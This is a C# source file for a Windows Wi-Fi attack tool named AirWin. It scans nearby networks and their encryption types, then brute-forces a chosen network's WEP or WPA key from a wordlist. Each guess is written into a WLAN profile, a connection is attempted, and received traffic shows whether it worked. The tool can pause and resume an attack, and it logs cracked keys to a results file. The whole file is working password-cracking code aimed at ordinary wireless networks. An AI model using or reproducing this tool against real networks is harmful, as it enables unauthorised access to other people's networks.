using NativeWifi;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

namespace AirWin
{
    class WifiAtackController : BackgroundWorker
    {

        private readonly static string path = @"results.txt";
        private readonly static string Separator = @"--------------------------------------------";
        private readonly string tmpFileName = @"AirWin.tmp";

        private WlanClient client = new WlanClient();
        private Wlan.WlanAvailableNetwork[] lista_redes;
        private Wlan.WlanBssEntry[] lista_bss;
        private WlanClient.WlanInterface INTERFAZ = null;
        private System.Net.NetworkInformation.NetworkInterface IfaceEthernet = null;
        string strAuth = string.Empty, strName = string.Empty, strCipher = string.Empty, strMAC = string.Empty;

        private static DataSets.WlanInfo infoWlan = new DataSets.WlanInfo();
        public DataSets.WlanInfo.WLANSRow SelectedWlan;
        bool connected = false;

        private string key;
        public event EventHandler UnitChanged;
        public string Key
        {
            get { return key; }
            set
            {
                if (value != key)
                {
                    key = value;
                    EventHandler handler = UnitChanged;
                    if (handler != null) handler(value.Clone(), EventArgs.Empty);
                }
            }
        }
        ~WifiAtackController(){
            DoWork -= bw_DoWork;
            base.Dispose(true);
        
        }

        public long MaxProgres { get; private set; }
        public bool WorkerFirstTime = false;
        public bool WorkerCancelled { get; set; }


        public bool isConnected { get { return connected; } }

        public int delay;
        public bool continueAttack { get; set; }
        private string diccionario = string.Empty;

        public bool isWlanSelected { get { return SelectedWlan != null; } }




        public WifiAtackController()
            : base()
        {

            client = new WlanClient();
            continueAttack = false;

            WorkerReportsProgress = true;
            WorkerSupportsCancellation = true;
            DoWork += bw_DoWork;
            WorkerCancelled = false;


        }

        public List<string> getInterfaceNames()
        {


            List<string> list = new List<string>(client.Interfaces.GetLength(0));
            foreach (WlanClient.WlanInterface Interfaz in client.Interfaces)
            {
                list.Add(Interfaz.InterfaceDescription);

            }
            return list;

        }
        public void saveAtack()
        {
            using (StreamWriter r = new StreamWriter(tmpFileName))
            {
                r.WriteLine(strName + "," + strAuth + "," + diccionario + "," + strAuth + "," + delay + "," + key);
            }
            CancelAsync();

        }

        public void saveResults()
        {
            StreamWriter sw;
            if (!File.Exists(path))
            {
                sw = File.CreateText(path);
            }
            else
            {
                sw = File.AppendText(path);
            }
            sw.WriteLine(strName);
            sw.WriteLine(strMAC);
            sw.WriteLine(key);
            sw.WriteLine(Separator);
            sw.Close();
            sw.Dispose();

        }

        public void StartAttack(string file, bool continuar)
        {

            diccionario = file;
            continueAttack = continuar;
            if (!IsBusy)
                RunWorkerAsync();
        }

        long get_session_ip()
        {
            long session = 0;
            session = IfaceEthernet.GetIPv4Statistics().BytesReceived;
            return session;
        }


        public bool CanRestartAttac()
        {
            return File.Exists(tmpFileName);
        }



        private void ataque_dicc()
        {

            long tcpPackets = get_session_ip();

            long performed = 0;
            MaxProgres = Utils.CountLinesInFile(diccionario);
            double percent = 0;
            string profileXml;
            bool keyLista = false;
            string tipo_key = "";
            string index_key = "";
            System.IO.StreamReader reader = null;
            try{
            if (File.Exists(tmpFileName))
            {
                if (continueAttack)
                {

                    using (StreamReader r = new StreamReader(tmpFileName))
                    {
                        String line = null;
                        line = r.ReadLine();
                        String[] vars = line.Split(',');
                        strName = vars[0];
                        strCipher = vars[1];
                        diccionario = vars[2];
                        strAuth = vars[3];
                        delay = int.Parse(vars[4]);
                        reader = new StreamReader(diccionario);
                        Key = string.Empty;
                        while (!vars[5].Equals(Key) && !reader.EndOfStream)
                        {
                            Key = reader.ReadLine();

                            performed++;
                            percent = performed / MaxProgres * 100;
                            ReportProgress((int)percent);
                        }
                        keyLista = true;


                    }
                    File.Delete(tmpFileName);


                } // cargar variables
                else
                {
                    File.Delete(tmpFileName);
                    reader = new StreamReader(diccionario);
                }
            }
            else
            {
                strName = SelectedWlan.ESSID;
                strCipher = WlanClient.getCipher(SelectedWlan.Cipher);
                strAuth = WlanClient.getAuth(SelectedWlan.Auth);
                reader = new StreamReader(diccionario);
            }

            while (!connected && !reader.EndOfStream && !CancellationPending)
            {
                if (!keyLista)
                {
                    Key = reader.ReadLine();
                }
                else keyLista = false;
                if (key_valid(Key, strCipher))
                {
                    tipo_key = "passPhrase";
                    if (strCipher == "WEP")
                        tipo_key = "networkKey";
                    if (strAuth == "open") { index_key = "<keyIndex>0</keyIndex>"; }
                    profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>{2}</authentication><encryption>{3}</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>{4}</keyType><protected>false</protected><keyMaterial>{1}</keyMaterial></sharedKey>{5}</security></MSM></WLANProfile>",
                                strName, Key, strAuth, strCipher, tipo_key, index_key);
                    INTERFAZ.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
                    INTERFAZ.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, strName);
                    performed++;
                    percent = performed / MaxProgres * 100;
                    ReportProgress((int)percent);
                    while (INTERFAZ.InterfaceState == Wlan.WlanInterfaceState.Associating || INTERFAZ.InterfaceState == Wlan.WlanInterfaceState.Authenticating)
                    {
                        Thread.Sleep(50);
                    }

                    Thread.Sleep(delay * 1000);

                    if (Math.Abs(IfaceEthernet.GetIPv4Statistics().BytesReceived - tcpPackets) > 3)
                    {
                        connected = true;
                    }

                    if (!connected)
                    {
                        INTERFAZ.DeleteProfile(strName);

                    }
                    Thread.Sleep(50);


                    if (CancellationPending)
                    {
                        WorkerCancelled = true;
                    }

                }
            }
            }
            
            catch(Exception ex) {
                Console.WriteLine(ex);
                Debug.WriteLine(ex);
            }
             finally { if(reader!=null)reader.Close(); }

        }
        void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            ataque_dicc();
        }


        private Boolean key_valid(string key, string cifrado)
        {
            if (cifrado == "WEP" && (key.Length == 5 || key.Length == 13))
                return true;
            else if (cifrado != "WEP" && key.Length > 5 && key.Length <= 65)
                return true;
            else return false;

        }
        public void setInterface(int ifaceIndex)
        {

            INTERFAZ = client.Interfaces[ifaceIndex];
            System.Net.NetworkInformation.NetworkInterface[] lista_ethernets = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface EtherIface in lista_ethernets)
            {
                if (INTERFAZ.InterfaceGuid.CompareTo(new Guid(EtherIface.Id)) == 0)
                {
                    IfaceEthernet = EtherIface;
                    break;
                }

            }
        }

        private Wlan.WlanAvailableNetwork devuelve_red(Wlan.Dot11Ssid X, Wlan.WlanAvailableNetwork[] lista)
        {
            Wlan.WlanAvailableNetwork ret = new Wlan.WlanAvailableNetwork();
            int long2 = lista.GetLength(0);

            for (int i = 0; i < long2; i++)
            {
                if (X.Equals(lista[i].dot11Ssid))
                {
                    ret = lista[i];
                    break;
                }
            }
            return ret;
        }


        public DataSets.WlanInfo getWlanInfo()
        {

            infoWlan.WLANS.Clear();
            lista_bss = INTERFAZ.GetNetworkBssList();
            INTERFAZ.Scan();
            lista_redes = INTERFAZ.GetAvailableNetworkList(0);
            Wlan.WlanAvailableNetwork WLAN = new Wlan.WlanAvailableNetwork();
            foreach (Wlan.WlanBssEntry redBSS in lista_bss)
            {
                DataSets.WlanInfo.WLANSRow row = infoWlan.WLANS.NewWLANSRow();

                WLAN = devuelve_red(redBSS.dot11Ssid, lista_redes);
                row.ESSID = Encoding.ASCII.GetString(redBSS.dot11Ssid.SSID, 0, (int)redBSS.dot11Ssid.SSIDLength);
                row.BSSID = Utils.ByteArrayToString(redBSS.dot11Bssid);
                row.Auth = WLAN.dot11DefaultAuthAlgorithm.ToString();
                row.Cipher = WLAN.dot11DefaultCipherAlgorithm.ToString();
                row.PowerDbm = redBSS.rssi;
                infoWlan.WLANS.AddWLANSRow(row);

            }

            return infoWlan;


        }
        public void exportWlanInfo(string filename)
        {
            if (filename.ToLower().Contains(".xml"))
            {
                infoWlan.WriteXml(filename);
            }
            else
            {

                using (StreamWriter r = new StreamWriter(filename))
                {

                    foreach (DataSets.WlanInfo.WLANSRow row in infoWlan.WLANS.Rows)
                    {

                        r.WriteLine(row.ESSID, row.BSSID, WlanClient.getAuth(row.Auth), WlanClient.getCipher(row.Cipher), row.PowerDbm);
                    }
                }

            }
        }
    }
}
